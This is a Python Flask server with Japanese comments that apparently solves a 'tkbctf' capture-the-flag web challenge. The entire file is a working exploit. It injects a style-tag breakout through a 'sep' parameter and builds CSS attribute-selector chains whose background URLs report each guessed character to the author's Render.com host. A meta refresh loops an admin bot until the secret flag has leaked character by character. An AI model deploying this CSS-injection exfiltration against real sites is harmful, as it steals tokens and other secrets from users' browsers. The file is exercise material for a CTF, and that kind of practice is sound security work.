from flask import Flask, request, redirect
import urllib.parse
import sys

app = Flask(__name__)

# ==========================================
# 設定（あなたの環境に合わせて変更してください）
# ==========================================
# Render.comで発行されたあなたのURL（末尾のスラッシュなし）
MY_URL = "https://capture-the-f-l-a-g.onrender.com"

# Admin Botから見た脆弱なアプリのURL
TARGET_URL = "http://web:3000"

# 推測する文字のリスト（必要に応じて記号などを追加）
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"

# 状態管理（既知のフラグ）
KNOWN_FLAG = "tkbctf{"
# ==========================================

@app.route('/start')
def start():
    """Botに最初に踏ませるエンドポイント。状態をリセットして攻撃開始。"""
    global KNOWN_FLAG
    KNOWN_FLAG = "tkbctf{"
    print("[*] Attack Started! Resetting flag...", file=sys.stderr)
    return redirect('/next')

@app.route('/next')
def next_char():
    """次の1文字を特定するためのCSSとURLを動的に生成する"""
    global KNOWN_FLAG
    
    # フラグが閉じられたら攻撃終了
    if KNOWN_FLAG.endswith("}"):
        print(f"[!] FINISHED! Flag is: {KNOWN_FLAG}", file=sys.stderr)
        return f"<h1>Attack Finished!</h1><p>Flag: {KNOWN_FLAG}</p>"

    print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {len(KNOWN_FLAG)})", file=sys.stderr)

    # --- 1. CSSペイロードの生成 ---
    css_rules = []
    # 最初の 't' は --flag: "t の部分に吸収されるため、<a>タグのチェーンは 'k' から始まる
    existing_chars = KNOWN_FLAG[1:]
    current_pos = len(KNOWN_FLAG)

    for char in CHARSET:
        # a[id^="k"] ~ a[id^="b"] ~ ... というチェーンを作る
        selectors = [f'a[id^="{c}"]' for c in existing_chars]
        selectors.append(f'a[id^="{char}"]')
        selector_chain = " ~ ".join(selectors)

        # URLエンコード（記号対策）
        safe_char = urllib.parse.quote(char)
        # pos=current_pos を付与して、重複リクエストによる誤判定を防ぐ
        leak_url = f"{MY_URL}/leak?char={safe_char}&pos={current_pos}"
        
        rule = f"{selector_chain} {{ display: block; width: 10px; height: 10px; background: url('{leak_url}'); }}"
        css_rules.append(rule)

    css_payload = "\n".join(css_rules)

    # --- 2. sep配列の構築とリダイレクト ---
    # content="1.5; の部分は、Botがページを描画してリクエストを飛ばすまでの猶予（1.5秒）
    sep0 = f'"></style><meta http-equiv="refresh" content="1.5; url={MY_URL}/next"><style>{css_payload}</style>'
    sep1 = '<a id="'

    # ?sep=sep0&sep=sep1 を生成
    params = urllib.parse.urlencode({
        'sep': [sep0, sep1]
    }, doseq=True)

    exploit_url = f"{TARGET_URL}/?{params}"
    
    return redirect(exploit_url)

@app.route('/leak')
def leak():
    """CSSからの画像リクエスト（1文字特定）を受け取るエンドポイント"""
    global KNOWN_FLAG
    char = request.args.get('char')
    pos = request.args.get('pos', type=int)

    # リクエストされたposが、現在のフラグ長と一致している場合のみ追加する（重複防止）
    if char and pos == len(KNOWN_FLAG):
        KNOWN_FLAG += char
        print(f"[+] Leaked! New Flag: {KNOWN_FLAG}", file=sys.stderr)

    # ブラウザのエラーを防ぐため、1x1ピクセルの透明なGIF画像を返す
    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return transparent_gif, 200, {'Content-Type': 'image/gif'}

if __name__ == '__main__':
    # Render.comなどの環境ではPORT環境変数が使われるため対応
    import os
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)